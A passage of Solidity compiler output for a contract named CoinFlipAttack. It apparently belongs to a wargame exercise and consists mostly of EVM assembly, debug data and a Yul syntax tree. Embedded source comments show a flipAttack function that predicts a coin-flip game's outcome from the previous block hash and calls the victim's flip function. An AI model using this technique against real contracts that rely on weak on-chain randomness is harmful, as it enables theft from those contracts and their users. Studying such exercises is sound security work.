\"contracts/CoinFlipAttack.sol\":425:461  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinFlipAttack.sol\":404:461  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":472:488  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":504:510  FACTOR */\n      sload(0x01)\n        /* \"contracts/CoinFlipAttack.sol\":491:501  blockValue */\n      dup3\n        /* \"contracts/CoinFlipAttack.sol\":491:510  blockValue / FACTOR */\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n        /* \"contracts/CoinFlipAttack.sol\":472:510  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":520:529  bool side */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":544:545  1 */\n      0x01\n        /* \"contracts/CoinFlipAttack.sol\":532:540  coinFlip */\n      dup3\n        /* \"contracts/CoinFlipAttack.sol\":532:545  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlipAttack.sol\":532:560  coinFlip == 1 ? true : false */\n      tag_16\n      jumpi\n        /* \"contracts/CoinFlipAttack.sol\":555:560  false */\n      0x00\n        /* \"contracts/CoinFlipAttack.sol\":532:560  coinFlip == 1 ? true : false */\n      jump(tag_17)\n    tag_16:\n        /* \"contracts/CoinFlipAttack.sol\":548:552  true */\n      0x01\n        /* \"contracts/CoinFlipAttack.sol\":532:560  coinFlip == 1 ? true : false */\n    tag_17:\n        /* \"contracts/CoinFlipAttack.sol\":520:560  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":570:584  victimContract */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/CoinFlipAttack.sol\":570:589  victimContract.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/CoinFlipAttack.sol\":590:594  side */\n      dup3\n        /* \"contracts/CoinFlipAttack.sol\":570:595  victimContract.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":394:602  {... */\n      pop\n      pop\n      pop\n        /* \"contracts/CoinFlipAttack.sol\":365:602  function flipAttack() public {... */\n      jump\t// out\n        /* \"contracts/CoinFlipAttack.sol\":121:152  CoinFlip public  victimContract */\n    tag_8:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_24:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_25:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_26:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_44\n        /* \"#utility.yul\":306:340   */\n      tag_45\n        /* \"#utility.yul\":315:339   */\n      tag_46\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_24\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":306:340   */\n      tag_25\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":288:341   */\n      tag_24\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_27:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_48\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_26\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:626   */\n    tag_28:\n        /* \"#utility.yul\":550:559   */\n      0x00\n        /* \"#utility.yul\":583:620   */\n      tag_50\n        /* \"#utility.yul\":614:619   */\n      dup3\n        /* \"#utility.yul\":583:620   */\n      tag_27\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":570:620   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:626   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":632:793   */\n    tag_29:\n        /* \"#utility.yul\":734:786   */\n      tag_52\n        /* \"#utility.yul\":780:785   */\n      dup2\n        /* \"#utility.yul\":734:786   */\n      tag_28\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":729:732   */\n      dup3\n        /* \"#utility.yul\":722:787   */\n      mstore\n        /* \"#utility.yul\":632:793   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":799:1051   */\n    tag_10:\n        /* \"#utility.yul\":907:911   */\n      0x00\n        /* \"#utility.yul\":945:947   */\n      0x20\n        /* \"#utility.yul\":934:943   */\n      dup3\n        /* \"#utility.yul\":930:948   */\n      add\n        /* \"#utility.yul\":922:948   */\n      swap1\n      pop\n        /* \"#utility.yul\":958:1044   */\n      tag_54\n        /* \"#utility.yul\":1041:1042   */\n      0x00\n        /* \"#utility.yul\":1030:1039   */\n      dup4\n        /* \"#utility.yul\":1026:1043   */\n      add\n        /* \"#utility.yul\":1017:1023   */\n      dup5\n        /* \"#utility.yul\":958:1044   */\n      tag_29\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":799:1051   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1057:1134   */\n    tag_30:\n        /* \"#utility.yul\":1094:1101   */\n      0x00\n        /* \"#utility.yul\":1123:1128   */\n      dup2\n        /* \"#utility.yul\":1112:1128   */\n      swap1\n      pop\n        /* \"#utility.yul\":1057:1134   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1140:1320   */\n    tag_31:\n        /* \"#utility.yul\":1188:1265   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1185:1186   */\n      0x00\n        /* \"#utility.yul\":1178:1266   */\n      mstore\n        /* \"#utility.yul\":1285:1289   */\n      0x11\n        /* \"#utility.yul\":1282:1283   */\n      0x04\n        /* \"#utility.yul\":1275:1290   */\n      mstore\n        /* \"#utility.yul\":1309:1313   */\n      0x24\n        /* \"#utility.yul\":1306:1307   */\n      0x00\n        /* \"#utility.yul\":1299:1314   */\n      revert\n        /* \"#utility.yul\":1326:1520   */\n    tag_13:\n        /* \"#utility.yul\":1366:1370   */\n      0x00\n        /* \"#utility.yul\":1386:1406   */\n      tag_58\n        /* \"#utility.yul\":1404:1405   */\n      dup3\n        /* \"#utility.yul\":1386:1406   */\n      tag_30\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1381:1406   */\n      swap2\n      pop\n        /* \"#utility.yul\":1420:1440   */\n      tag_59\n        /* \"#utility.yul\":1438:1439   */\n      dup4\n        /* \"#utility.yul\":1420:1440   */\n      tag_30\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1415:1440   */\n      swap3\n      pop\n        /* \"#utility.yul\":1464:1465   */\n      dup3\n        /* \"#utility.yul\":1461:1462   */\n      dup3\n        /* \"#utility.yul\":1457:1466   */\n      sub\n        /* \"#utility.yul\":1449:1466   */\n      swap1\n      pop\n        /* \"#utility.yul\":1488:1489   */\n      dup2\n        /* \"#utility.yul\":1482:1486   */\n      dup2\n        /* \"#utility.yul\":1479:1490   */\n      gt\n        /* \"#utility.yul\":1476:1513   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1493:1511   */\n      tag_61\n      tag_31\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1476:1513   */\n    tag_60:\n        /* \"#utility.yul\":1326:1520   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1526:1706   */\n    tag_32:\n        /* \"#utility.yul\":1574:1651   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1571:1572   */\n      0x00\n        /* \"#utility.yul\":1564:1652   */\n      mstore\n        /* \"#utility.yul\":1671:1675   */\n      0x12\n        /* \"#utility.yul\":1668:1669   */\n      0x04\n        /* \"#utility.yul\":1661:1676   */\n      mstore\n        /* \"#utility.yul\":1695:1699   */\n      0x24\n        /* \"#utility.yul\":1692:1693   */\n      0x00\n        /* \"#utility.yul\":1685:1700   */\n      revert\n        /* \"#utility.yul\":1712:1897   */\n    tag_15:\n        /* \"#utility.yul\":1752:1753   */\n      0x00\n        /* \"#utility.yul\":1769:1789   */\n      tag_64\n        /* \"#utility.yul\":1787:1788   */\n      dup3\n        /* \"#utility.yul\":1769:1789   */\n      tag_30\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1764:1789   */\n      swap2\n      pop\n        /* \"#utility.yul\":1803:1823   */\n      tag_65\n        /* \"#utility.yul\":1821:1822   */\n      dup4\n        /* \"#utility.yul\":1803:1823   */\n      tag_30\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1798:1823   */\n      swap3\n      pop\n        /* \"#utility.yul\":1842:1843   */\n      dup3\n        /* \"#utility.yul\":1832:1867   */\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1847:1865   */\n      tag_67\n      tag_32\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1832:1867   */\n    tag_66:\n        /* \"#utility.yul\":1889:1890   */\n      dup3\n        /* \"#utility.yul\":1886:1887   */\n      dup3\n        /* \"#utility.yul\":1882:1891   */\n      div\n        /* \"#utility.yul\":1877:1891   */\n      swap1\n      pop\n        /* \"#utility.yul\":1712:1897   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1903:1993   */\n    tag_33:\n        /* \"#utility.yul\":1937:1944   */\n      0x00\n        /* \"#utility.yul\":1980:1985   */\n      dup2\n        /* \"#utility.yul\":1973:1986   */\n      iszero\n        /* \"#utility.yul\":1966:1987   */\n      iszero\n        /* \"#utility.yul\":1955:1987   */\n      swap1\n      pop\n        /* \"#utility.yul\":1903:1993   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1999:2108   */\n    tag_34:\n        /* \"#utility.yul\":2080:2101   */\n      tag_70\n        /* \"#utility.yul\":2095:2100   */\n      dup2\n        /* \"#utility.yul\":2080:2101   */\n      tag_33\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2075:2078   */\n      dup3\n        /* \"#utility.yul\":2068:2102   */\n      mstore\n        /* \"#utility.yul\":1999:2108   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2114:2324   */\n    tag_19:\n        /* \"#utility.yul\":2201:2205   */\n      0x00\n        /* \"#utility.yul\":2239:2241   */\n      0x20\n        /* \"#utility.yul\":2228:2237   */\n      dup3\n        /* \"#utility.yul\":2224:2242   */\n      add\n        /* \"#utility.yul\":2216:2242   */\n      swap1\n      pop\n        /* \"#utility.yul\":2252:2317   */\n      tag_72\n        /* \"#utility.yul\":2314:2315   */\n      0x00\n        /* \"#utility.yul\":2303:2312   */\n      dup4\n        /* \"#utility.yul\":2299:2316   */\n      add\n        /* \"#utility.yul\":2290:2296   */\n      dup5\n        /* \"#utility.yul\":2252:2317   */\n      tag_34\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2114:2324   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2411:2528   */\n    tag_36:\n        /* \"#utility.yul\":2520:2521   */\n      0x00\n        /* \"#utility.yul\":2517:2518   */\n      0x00\n        /* \"#utility.yul\":2510:2522   */\n      revert\n        /* \"#utility.yul\":2657:2773   */\n    tag_38:\n        /* \"#utility.yul\":2727:2748   */\n      tag_77\n        /* \"#utility.yul\":2742:2747   */\n      dup2\n        /* \"#utility.yul\":2727:2748   */\n      tag_33\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2720:2725   */\n      dup2\n        /* \"#utility.yul\":2717:2749   */\n      eq\n        /* \"#utility.yul\":2707:2767   */\n      tag_78\n      jumpi\n        /* \"#utility.yul\":2763:2764   */\n      0x00\n        /* \"#utility.yul\":2760:2761   */\n      0x00\n        /* \"#utility.yul\":2753:2765   */\n      revert\n        /* \"#utility.yul\":2707:2767   */\n    tag_78:\n        /* \"#utility.yul\":2657:2773   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2779:2916   */\n    tag_39:\n        /* \"#utility.yul\":2833:2838   */\n      0x00\n        /* \"#utility.yul\":2864:2870   */\n      dup2\n        /* \"#utility.yul\":2858:2871   */\n      mload\n        /* \"#utility.yul\":2849:2871   */\n      swap1\n      pop\n        /* \"#utility.yul\":2880:2910   */\n      tag_80\n        /* \"#utility.yul\":2904:2909   */\n      dup2\n        /* \"#utility.yul\":2880:2910   */\n      tag_38\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2779:2916   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2922:3267   */\n    tag_23:\n        /* \"#utility.yul\":2989:2995   */\n      0x00\n        /* \"#utility.yul\":3038:3040   */\n      0x20\n        /* \"#utility.yul\":3026:3035   */\n      dup3\n        /* \"#utility.yul\":3017:3024   */\n      dup5\n        /* \"#utility.yul\":3013:3036   */\n      sub\n        /* \"#utility.yul\":3009:3041   */\n      slt\n        /* \"#utility.yul\":3006:3125   */\n      iszero\n      tag_82\n      jumpi\n        /* \"#utility.yul\":3044:3123   */\n      tag_83\n      tag_36\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":3006:3125   */\n    tag_82:\n        /* \"#utility.yul\":3164:3165   */\n      0x00\n        /* \"#utility.yul\":3189:3250   */\n      tag_84\n        /* \"#utility.yul\":3242:3249   */\n      dup5\n        /* \"#utility.yul\":3233:3239   */\n      dup3\n        /* \"#utility.yul\":3222:3231   */\n      dup6\n        /* \"#utility.yul\":3218:3240   */\n      add\n        /* \"#utility.yul\":3189:3250   */\n      tag_39\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":3179:3250   */\n      swap2\n      pop\n        /* \"#utility.yul\":3135:3260   */\n      pop\n        /* \"#utility.yul\":2922:3267   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122095598535040f4d928b04f0b5f86d1082bbc27f747f86c751e11a79e9ce98f39664736f6c634300081b0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_102": {
									"entryPoint": null,
									"id": 102,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 228,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 248,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 189,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 158,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 154,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 206,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1199:2",
										"nodeType": "YulBlock",
										"src": "0:1199:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "379:81:2",
													"nodeType": "YulBlock",
													"src": "379:81:2",
													"statements": [
														{
															"nativeSrc": "389:65:2",
															"nodeType": "YulAssignment",
															"src": "389:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:2",
																		"nodeType": "YulLiteral",
																		"src": "411:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:2"
																},
																"nativeSrc": "400:54:2",
																"nodeType": "YulFunctionCall",
																"src": "400:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:2",
														"nodeType": "YulTypedName",
														"src": "361:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:2",
														"nodeType": "YulTypedName",
														"src": "371:7:2",
														"type": ""
													}
												],
												"src": "334:126:2"
											},
											{
												"body": {
													"nativeSrc": "511:51:2",
													"nodeType": "YulBlock",
													"src": "511:51:2",
													"statements": [
														{
															"nativeSrc": "521:35:2",
															"nodeType": "YulAssignment",
															"src": "521:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:2"
																},
																"nativeSrc": "532:24:2",
																"nodeType": "YulFunctionCall",
																"src": "532:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:2",
														"nodeType": "YulTypedName",
														"src": "493:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:2",
														"nodeType": "YulTypedName",
														"src": "503:7:2",
														"type": ""
													}
												],
												"src": "466:96:2"
											},
											{
												"body": {
													"nativeSrc": "611:79:2",
													"nodeType": "YulBlock",
													"src": "611:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:2",
																"nodeType": "YulBlock",
																"src": "668:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:2",
																					"nodeType": "YulLiteral",
																					"src": "677:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:2",
																					"nodeType": "YulLiteral",
																					"src": "680:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:2"
																			},
																			"nativeSrc": "670:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:2"
																		},
																		"nativeSrc": "670:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:2"
																				},
																				"nativeSrc": "641:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:2"
																		},
																		"nativeSrc": "631:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:2"
																},
																"nativeSrc": "624:43:2",
																"nodeType": "YulFunctionCall",
																"src": "624:43:2"
															},
															"nativeSrc": "621:63:2",
															"nodeType": "YulIf",
															"src": "621:63:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:2",
														"nodeType": "YulTypedName",
														"src": "604:5:2",
														"type": ""
													}
												],
												"src": "568:122:2"
											},
											{
												"body": {
													"nativeSrc": "759:80:2",
													"nodeType": "YulBlock",
													"src": "759:80:2",
													"statements": [
														{
															"nativeSrc": "769:22:2",
															"nodeType": "YulAssignment",
															"src": "769:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "784:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "778:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:2"
																},
																"nativeSrc": "778:13:2",
																"nodeType": "YulFunctionCall",
																"src": "778:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "769:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "827:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "800:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:2"
																},
																"nativeSrc": "800:33:2",
																"nodeType": "YulFunctionCall",
																"src": "800:33:2"
															},
															"nativeSrc": "800:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "800:33:2"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nativeSrc": "696:143:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "737:6:2",
														"nodeType": "YulTypedName",
														"src": "737:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "745:3:2",
														"nodeType": "YulTypedName",
														"src": "745:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "753:5:2",
														"nodeType": "YulTypedName",
														"src": "753:5:2",
														"type": ""
													}
												],
												"src": "696:143:2"
											},
											{
												"body": {
													"nativeSrc": "922:274:2",
													"nodeType": "YulBlock",
													"src": "922:274:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "968:83:2",
																"nodeType": "YulBlock",
																"src": "968:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "970:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:2"
																			},
																			"nativeSrc": "970:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:2"
																		},
																		"nativeSrc": "970:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "943:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "952:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "939:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:2"
																		},
																		"nativeSrc": "939:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "964:2:2",
																		"nodeType": "YulLiteral",
																		"src": "964:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "935:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:2"
																},
																"nativeSrc": "935:32:2",
																"nodeType": "YulFunctionCall",
																"src": "935:32:2"
															},
															"nativeSrc": "932:119:2",
															"nodeType": "YulIf",
															"src": "932:119:2"
														},
														{
															"nativeSrc": "1061:128:2",
															"nodeType": "YulBlock",
